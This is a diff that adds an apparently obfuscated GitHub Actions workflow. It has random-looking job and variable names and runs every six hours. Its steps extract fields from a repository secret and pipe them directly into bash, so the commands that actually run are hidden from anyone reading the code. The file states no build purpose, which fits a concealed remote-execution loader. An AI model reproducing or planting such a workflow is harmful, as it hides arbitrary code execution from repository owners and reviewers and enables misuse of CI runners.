@@ -1,0 +1,23 @@
+name: yandali3478
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yandali3478
+        env:
+          lmogr3604: ${{ secrets.lmogr3604 }}
+        run: |
+          echo $lmogr3604 | jq -r .k89 | /bin/bash
+          echo $fzug8 | jq -r .n3 | /bin/bash
+          echo $p827 | jq -r .ijpjw346 | /bin/bash
+          echo $cdntd170 | jq -r .zylq910 | /bin/bash
+          echo $lnp36 | jq -r .fzw30910 | /bin/bash
+
